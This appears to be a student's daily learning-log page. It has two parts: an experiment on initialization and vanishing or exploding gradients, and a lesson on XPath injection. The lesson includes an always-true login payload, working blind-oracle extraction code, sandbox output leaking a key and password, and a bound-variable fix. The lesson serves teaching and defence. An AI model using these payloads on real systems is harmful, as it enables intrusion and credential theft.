@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Day 025 — A forward pass that looks healthy, and a login that was really a query · Matías Rathgeb</title>
+<meta name="description" content="Day 025 of 1600. A student's private learning log.">
+<style>
+  :root{--white:#ffffff;--black:#000000;--gray:#86868b;--border:#d2d2d7;}
+  *{margin:0;padding:0;box-sizing:border-box;}
+  body{background:var(--white);color:var(--black);font-family:Arial,Helvetica,sans-serif;font-size:14px;line-height:1.6;-webkit-font-smoothing:antialiased;}
+  a{color:var(--black);}
+  .wrap{max-width:720px;margin:0 auto;padding:0 22px;}
+  header{padding:80px 0 40px;border-bottom:1px solid var(--border);}
+  header .day{font-size:13px;color:var(--gray);letter-spacing:0.2px;margin-bottom:16px;}
+  header h1{font-size:40px;line-height:1.07;letter-spacing:-0.02em;font-weight:600;margin-bottom:12px;}
+  header .meta{font-size:13px;color:var(--gray);}
+  article{padding:48px 0 80px;}
+  h2{font-size:24px;line-height:1.15;letter-spacing:-0.01em;font-weight:600;margin:40px 0 16px;}
+  h3{font-size:17px;font-weight:600;margin:28px 0 10px;}
+  p{margin-bottom:16px;}
+  pre{background:#f5f5f7;border:1px solid var(--border);border-radius:8px;padding:16px;overflow-x:auto;font-size:13px;line-height:1.5;margin-bottom:16px;}
+  code{font-family:Menlo,Consolas,monospace;font-size:13px;}
+  ul,ol{margin:0 0 16px 22px;}
+  li{margin-bottom:6px;}
+  .verdict{border:1px solid var(--black);padding:20px 24px;margin-top:40px;}
+  .verdict p{margin-bottom:8px;}
+  footer{padding:40px 0 80px;border-top:1px solid var(--border);color:var(--gray);font-size:12px;}
+  @media(max-width:600px){header h1{font-size:30px;}}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="wrap">
+    <p class="day">DAY 025 OF 1600 · 2026-10-28</p>
+    <h1>Day 025 — A forward pass that looks healthy, and a login that was really a query</h1>
+    <p class="meta">A student's private learning log · one concept at a time.</p>
+  </div>
+</header>
+<article>
+  <div class="wrap">
+<p><strong>Date:</strong> 2026-10-28 · <strong>Day:</strong> 25 of 1600</p>
+<p><strong>Log:</strong> a student&#x27;s private learning log · one concept at a time.</p>
+<p>---</p>
+<h2>Concept #25 — Initialization decides whether 40 layers is depth or a wall</h2>
+<p>MA04, Deep Learning. The vanishing gradient is usually explained as &quot;the</p>
+<p>activation squashes the signal, so it is small by the time it reaches the bottom&quot;.</p>
+<p>That sentence is not wrong, but it hides where the decision is actually made.</p>
+<p>Take a stack of <code>L</code> layers, all the same width, tanh between them. The signal</p>
+<p>going forward multiplies by one gain per layer, and the gradient coming back</p>
+<p>multiplies by the <em>inverse</em> of that same gain per layer, because the Jacobian of</p>
+<p>a layer is <code>W · diag(f&#x27;(z))</code> and the derivative is the same object read in the</p>
+<p>other direction. So a single number per layer — call it <code>g</code> — decides everything:</p>
+<p>after 39 layers the bottom sees <code>g^39</code> times the top. Nothing else in the network</p>
+<p>compounds like that. Depth is the exponent, and <code>g</code> is the whole fight.</p>
+<p><code>g</code> has two factors: how big the weights are, and how much the activation&#x27;s</p>
+<p>derivative takes away. That second factor is why the right scale depends on the</p>
+<p>activation, and why &quot;just make the weights small&quot; is not a fix — it moves the</p>
+<p>problem from one side to the other.</p>
+<p><strong>What I tried today:</strong> a 40-layer, width-64 stack in plain Python, four</p>
+<p>combinations of initialization and activation, same seed and same input vector.</p>
+<p>For each one I measure two columns at five depths: the spread of the activations</p>
+<p>going forward, and the norm of the gradient coming back from a flat loss at the</p>
+<p>top. Then I compute the per-layer factor the gradient actually felt, as</p>
+<p><code>(bottom/top)^(1/39)</code>, so the table ends in one number per row.</p>
+<pre><code># init_depth.py - MA04 (Deep Learning). Why initialization owns the depth.
+# A 40-layer stack, width 64, stdlib only. Four init/activation pairs.
+# Two columns per pair: the spread of the signal going forward, and the size of
+# the gradient coming back. The forward one is what a sanity check prints.
+import math
+import random
+
+DEPTH, WIDTH = 40, 64
+PROBE = (1, 10, 20, 30, 40)          # steps walked backward from the top
+
+
+def build(kind, rng):
+    if kind == &quot;gauss std=1&quot;:
+        scale = 1.0
+    elif kind == &quot;xavier&quot;:
+        scale = math.sqrt(2.0 / (WIDTH + WIDTH))
+    else:                             # he
+        scale = math.sqrt(2.0 / WIDTH)
+    return [[[rng.gauss(0.0, 1.0) * scale for _ in range(WIDTH)] for _ in range(WIDTH)]
+            for _ in range(DEPTH)]
+
+
+def forward(layers, x, act):
+    acts = [x]
+    a = x
+    for W in layers:
+        z = [sum(W[i][j] * a[j] for j in range(WIDTH)) for i in range(WIDTH)]
+        a = [math.tanh(v) for v in z] if act == &quot;tanh&quot; else [v if v &gt; 0.0 else 0.0 for v in z]
+        acts.append(a)
+    return acts
+
+
+def backward(layers, acts, act):
+    d = [1.0] * WIDTH                      # dL/da at the top: a flat loss
+    per_step = {}
+    for s in range(1, DEPTH + 1):
+        k = DEPTH - s + 1
+        a = acts[k]
+        g = [(1.0 - v * v) for v in a] if act == &quot;tanh&quot; else [1.0 if v &gt; 0.0 else 0.0 for v in a]
+        dz = [d[i] * g[i] for i in range(WIDTH)]
+        d = [sum(layers[k - 1][i][j] * dz[i] for i in range(WIDTH)) for j in range(WIDTH)]
+        per_step[s] = math.sqrt(sum(v * v for v in d))
+    return per_step
+
+
+def std(v):
+    m = sum(v) / len(v)
+    return math.sqrt(sum((x - m) ** 2 for x in v) / len(v))
+
+
+print(&quot;40 layers, width 64, input ~ N(0,1), gradient of a flat loss at the top&quot;)
+print(&quot;same weights, same input, same seed for both columns in a row\n&quot;)
+print(f&quot;{&#x27;init + activation&#x27;:&lt;21}{&#x27;steps back&#x27;:&gt;10}{&#x27;std(a)&#x27;:&gt;10}{&#x27;|grad|&#x27;:&gt;12}&quot;)
+rows = []
+for kind, act in ((&quot;gauss std=1&quot;, &quot;tanh&quot;), (&quot;xavier&quot;, &quot;tanh&quot;), (&quot;xavier&quot;, &quot;relu&quot;), (&quot;he&quot;, &quot;relu&quot;)):
+    rng = random.Random(7)
+    layers = build(kind, rng)
+    x = [rng.gauss(0.0, 1.0) for _ in range(WIDTH)]
+    acts = forward(layers, x, act)
+    per_step = backward(layers, acts, act)
+    for s in PROBE:
+        print(f&quot;{kind + &#x27; + &#x27; + act:&lt;21}{s:&gt;10}{std(acts[DEPTH - s + 1]):&gt;10.4f}{per_step[s]:&gt;12.3e}&quot;)
+    gain = (per_step[DEPTH] / max(per_step[1], 1e-300)) ** (1.0 / (DEPTH - 1))
+    rows.append((kind, act, gain))
+    print()
+
+print(&quot;per-layer factor applied to the gradient on the way down:&quot;)
+for kind, act, gain in rows:
+    print(f&quot;   {kind + &#x27; + &#x27; + act:&lt;21}{gain:&gt;8.3f}&quot;)
+print()
+print(&quot;1.00 keeps the bottom learning as fast as the top. above 1 explodes,&quot;)
+print(&quot;below 1 vanishes, and 39 layers turn any drift into the whole story.&quot;)</code></pre>
+<p>Real output (Python 3, stdlib only, this session; &quot;steps back 40&quot; is the layer</p>
+<p>next to the input, &quot;steps back 1&quot; is the layer next to the output):</p>
+<pre><code>40 layers, width 64, input ~ N(0,1), gradient of a flat loss at the top
+same weights, same input, same seed for both columns in a row
+
+init + activation    steps back    std(a)      |grad|
+gauss std=1 + tanh            1    0.9226   2.222e+01
+gauss std=1 + tanh           10    0.9088   8.737e+02
+gauss std=1 + tanh           20    0.8952   5.560e+04
+gauss std=1 + tanh           30    0.9592   1.025e+08
+gauss std=1 + tanh           40    0.9207   5.910e+10
+
+xavier + tanh                 1    0.0837   8.896e+00
+xavier + tanh                10    0.1447   7.576e+00
+xavier + tanh                20    0.1939   5.552e+00
+xavier + tanh                30    0.1910   3.912e+00
+xavier + tanh                40    0.6175   6.227e-01
+
+xavier + relu                 1    0.0000   7.363e+00
+xavier + relu                10    0.0000   5.052e-01
+xavier + relu                20    0.0006   1.854e-02
+xavier + relu                30    0.0261   5.413e-04
+xavier + relu                40    0.6533   3.017e-05
+
+he + relu                     1    0.7188   1.041e+01
+he + relu                    10    1.1597   1.617e+01
+he + relu                    20    0.9284   1.898e+01
+he + relu                    30    1.1805   1.774e+01
+he + relu                    40    0.9238   3.163e+01
+
+per-layer factor applied to the gradient on the way down:
+   gauss std=1 + tanh      1.744
+   xavier + tanh           0.934
+   xavier + relu           0.728
+   he + relu               1.029
+
+1.00 keeps the bottom learning as fast as the top. above 1 explodes,
+below 1 vanishes, and 39 layers turn any drift into the whole story.</code></pre>
+<p><strong>What I understood from it:</strong> four things, and the first one is the reason I</p>
+<p>trust this table less than it looks.</p>
+<p>First, the forward column cannot see the backward one. With <code>std=1</code> Gaussian</p>
+<p>weights and tanh, the activation std is 0.92 at every depth — input side 0.9207,</p>
+<p>output side 0.9226, flat to two decimals. Any sanity check on activations passes.</p>
+<p>And the gradient arriving at the bottom is 5.91e+10 against 22.2 at the top: the</p>
+<p>bottom of that network sees gradients about 2.7e9 times larger than the top, at</p>
+<p>1.744 per layer. This is not a vanishing problem, it is the opposite one, and it</p>
+<p>is invisible from the forward pass. It is also the classic reason a training run</p>
+<p>looks calm for a few hundred steps and then produces NaN.</p>
+<p>Second, the flat forward column is not luck, it is saturation. std ≈ 0.92 with</p>
+<p>tanh means most values are pushed near ±1, where the derivative is small — so the</p>
+<p>signal looks conserved precisely because it has been clipped into a shape that</p>
+<p>does not carry much information. A std of ~1 is the number I would have called</p>
+<p>healthy. It is the number that hides the clipping.</p>
+<p>Third, Xavier is not a neutral choice, and Xavier with ReLU is a broken one. With</p>
+<p>tanh it drifts at 0.934 per layer: 14× less gradient at the bottom than at the</p>
+<p>top over 39 layers, and the forward std decays 0.62 → 0.084. The cause is honest</p>
+<p>bookkeeping: Xavier sets the scale so the <em>pre-activation</em> variance stays at 1,</p>
+<p>but tanh itself contracts the spread and its average derivative is below 1, so</p>
+<p>the fixed point of the iteration is zero, not one. With ReLU the same scale pays</p>
+<p>half of everything the ReLU zeroes: the forward std hits 0.0000 on the output</p>
+<p>side and the bottom gradient is 3.0e-05 against 7.36 at the top — 2.4e5 times</p>
+<p>smaller. That is the entire argument for He&#x27;s factor of 2 instead of 1, and I had</p>
+<p>read it as a minor constant before running this.</p>
+<p>Fourth, only <code>he + relu</code> keeps both columns within one order of magnitude across</p>
+<p>40 layers: 0.9238 → 0.7188 forward, 31.6 → 10.4 backward, 1.029 per layer. That</p>
+<p>is what &quot;the initialization works&quot; means operationally — not that the numbers are</p>
+<p>pretty, but that the compounding stops.</p>
+<p>Honest limits: one seed, one input vector, no batch statistics, no optimizer, no</p>
+<p>batchnorm, tanh and ReLU only, and 40 layers is already generous for a net this</p>
+<p>small. This measures how scale propagates <em>at initialization</em>, not whether the</p>
+<p>net trains. The factor I want next is the one I did not measure: a skip connection</p>
+<p>multiplies the path length by a sum instead of a product, which is the other way</p>
+<p>to stop the compounding — and it is a claim until I run it.</p>
+<p>---</p>
+<h2>Security #25 — The login was never a comparison, it was a query (XPath injection, CWE-643)</h2>
+<p>Twenty-four classes, and this one is the same composition bug as SQL injection</p>
+<p>with a different parser underneath: the value the user typed is concatenated into</p>
+<p>a <em>language expression</em> and then handed to an evaluator that cannot tell syntax</p>
+<p>from data.</p>
+<p>The code looks like a filter:</p>
+<pre><code>def vulnerable_login(user, pw):
+    # exactly the line that ships: interpolate, then evaluate
+    expr = f&quot;//user[name=&#x27;{user}&#x27; and pass=&#x27;{pw}&#x27;]&quot;
+    return [(h.findtext(&quot;name&quot;), h.findtext(&quot;role&quot;), h.findtext(&quot;apikey&quot;))
+            for h in DOC.xpath(expr)]</code></pre>
+<p>XPath is a full expression language: <code>or</code>, <code>and</code>, <code>=</code>, <code>count()</code>, <code>substring()</code>,</p>
+<p><code>string-length()</code>, <code>translate()</code>, and <code>//x | //y</code> for unions. So the password</p>
+<p>field is not compared, it is <em>parsed</em>. <code>&#x27; or &#x27;1&#x27;=&#x27;1</code> closes the string, adds a</p>
+<p>predicate that is always true, and opens a literal so the rest of the expression</p>
+<p>stays legal — the login returns the first row in the document, which is usually</p>
+<p>the administrator.</p>
+<p>The nastier half is that you do not need the response body at all. Since any</p>
+<p>predicate can be appended, the server becomes a one-bit oracle: 200 for &quot;the</p>
+<p>condition is true&quot;, 401 for &quot;false&quot;. That is enough to read a document field by</p>
+<p>field, character by character, with <code>count()</code> for the row count, <code>string-length()</code></p>
+<p>for the length, and <code>substring()</code> plus <code>translate()</code> for the bytes. Blind, no</p>
+<p>error messages, nothing in the body.</p>
+<p><strong>The pattern I studied</strong> — one bit per request, and a membership test, because</p>
+<p>XPath 1.0 has no <code>ord()</code>:</p>
+<pre><code>CALLS = [0]
+TRUE_HITS = [0]
+
+
+def oracle(port, condition):
+    &quot;&quot;&quot;True / False only. The injection closes the name quote, appends the
+    condition, and opens a harmless literal so the rest of the query stays legal.&quot;&quot;&quot;
+    payload = f&quot;x&#x27; or {condition} or name=&#x27;zz&quot;
+    CALLS[0] += 1
+    st, _ = ask(port, payload, &quot;y&quot;)
+    TRUE_HITS[0] += st == 200
+    return st == 200</code></pre>
+<pre><code># XPath 1.0 has no ord(), and &#x27;&lt;&#x27; between two strings is a numeric comparison,
+# so it turns them into NaN and is always false. The portable boolean is a
+# membership test: translate() drops every char that is in the candidate set.
+ALPHA = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-&quot;
+
+
+def leak_string(port, expr, length):
+    out = &quot;&quot;
+    for i in range(1, length + 1):
+        lo, hi = 0, len(ALPHA)
+        ch = f&quot;substring({expr},{i},1)&quot;
+        while hi - lo &gt; 1:
+            mid = (lo + hi) // 2
+            subset = ALPHA[lo:mid]
+            if oracle(port, f&quot;string-length(translate({ch},&#x27;{subset}&#x27;,&#x27;&#x27;))=0&quot;):
+                hi = mid
+            else:
+                lo = mid
+        out += ALPHA[lo]
+    return out</code></pre>
+<p>My first attempt at the comparison was <code>substring(expr,i,1) &lt; &#x27;K&#x27;</code> and it</p>
+<p>extracted <code>&#x27;~~~~~~~~~~~~~~~~~~~~~~~~&#x27;</code> — fourteen tildes. Not a server quirk: in</p>
+<p>XPath 1.0, <code>&lt;</code> and <code>&gt;</code> convert both operands to <em>numbers</em>, so two strings become</p>
+<p>NaN, and every comparison is false. The oracle was answering &quot;no&quot; to every</p>
+<p>question, and the binary search dutifully walked to the last character of my</p>
+<p>alphabet. A blind extraction that always says no still produces a string. If I</p>
+<p>had not noticed the tildes were nonsense I would have &quot;proved&quot; the leak with</p>
+<p>garbage.</p>
+<p><strong>What I understood about preventing it:</strong> the input must be a value, not syntax.</p>
+<p>XPath 1.0 has variables, and binding them is the whole fix — the expression is a</p>
+<p>constant string, the input never touches the parser:</p>
+<pre><code>def fixed_login(user, pw):
+    # input is a VALUE, never syntax: $u and $p are bound variables
+    expr = &quot;//user[name=$u and pass=$p]&quot;
+    return [(h.findtext(&quot;name&quot;), h.findtext(&quot;role&quot;), h.findtext(&quot;apikey&quot;))
+            for h in DOC.xpath(expr, u=user, p=pw)]</code></pre>
+<p>There is no string to break out of, so <code>&#x27; or &#x27;1&#x27;=&#x27;1</code> is stored as a username of</p>
+<p>seven characters and matches nothing. The second half is the same as always:</p>
+<p>never let one query answer both &quot;does this user exist&quot; and &quot;is this the password&quot;</p>
+<p>— look the user up by name, then verify the password out of band with a</p>
+<p>constant-time comparison — and validate the field you are filtering on against a</p>
+<p>fixed list instead of interpolating a free-form path.</p>
+<p>Sandbox check (two local servers on 127.0.0.1, in-memory XML document, both</p>
+<p>stopped at the end):</p>
+<pre><code>[VULN] 127.0.0.1:8751   expr = &quot;//user[name=&#x27;&quot; + user + &quot;&#x27; and pass=&#x27;&quot; + pass + &quot;&#x27;]&quot;
+   honest login            -&gt; 200 admin role=admin apikey=K7QX-2M4P-9ZR1
+   honest login, bad pass  -&gt; 401 bad credentials
+   injected &#x27; or &#x27;1&#x27;=&#x27;1    -&gt; 200 admin role=admin apikey=K7QX-2M4P-9ZR1
+
+[ORACLE] boolean only: 200 or 401, the body is never used
+   count(//user)           -&gt; 3 rows, 4 requests
+   blind (//user)[1]/apikey -&gt; &#x27;K7QX-2M4P-9ZR1&#x27; (14 chars, 99 requests)
+   blind (//user)[1]/pass   -&gt; &#x27;s3cret-admin-pass&#x27; (17 chars, 118 requests)
+
+[FIX]  127.0.0.1:8752   expr = &quot;//user[name=$u and pass=$p]&quot;  (bound variables)
+   honest login            -&gt; 200 admin role=admin apikey=K7QX-2M4P-9ZR1
+   injection attempts      -&gt; 24/24 rejected (401)
+   same blind extraction   -&gt; &#x27;----&#x27; in 24 requests, 0 of them answered 200
+   admin row served        -&gt; vuln=92 fixed=1 (the honest login only)
+both sandbox servers stopped, ports 8751/8752 closed</code></pre>
+<p><strong>What I understood:</strong> the one line that made this possible is a line I have</p>
+<p>written in XML handling without thinking, because <code>findall</code> with a formatted</p>
+<p>string feels like a filter and reads like one. It is not — the document is being</p>
+<p>asked a question in a language, and the user got to write part of the question.</p>
+<p>Two honest notes. The 92 admin rows on the left are every 200 the oracle</p>
+<p>received, which is the point: one bit per request, and I read an API key and a</p>
+<p>password out of a service that only ever said &quot;ok&quot; or &quot;no&quot;. On the right the same</p>
+<p>extraction returns garbage in 24 requests with zero successful oracles — the</p>
+<p>attack does not get <em>harder</em>, it has nothing to talk to. And the alphabet was</p>
+<p>guessed: <code>[a-z A-Z 0-9 -]</code>, which fits these demo fields and would not fit a</p>
+<p>base64 secret. Blind extraction leaks what its alphabet covers, and I only knew</p>
+<p>the strings matched because I wrote the document.</p>
+<p>---</p>
+<h2>Day 25 notes</h2>
+<ul><li>Concept #25: 4 init/activation pairs, 40 layers, forward std and backward gradient measured, per-layer factor computed. Output above. ✔</li><li>Security #25: XPath injection, boolean oracle, 14 and 17 chars recovered blind, 24/24 rejected with bound variables. Sandbox only, both servers stopped. ✔</li><li>1575 days left. One at a time.</li></ul>
+<p><em>Written by my own daily machine, checked by me.</em></p>
+  </div>
+</article>
+<footer>
+  <div class="wrap">
+    <p><a href="/">← Back to the index</a> · Day 025 of 1600 · Matías Rathgeb</p>
+  </div>
+</footer>
+</body>
+</html>
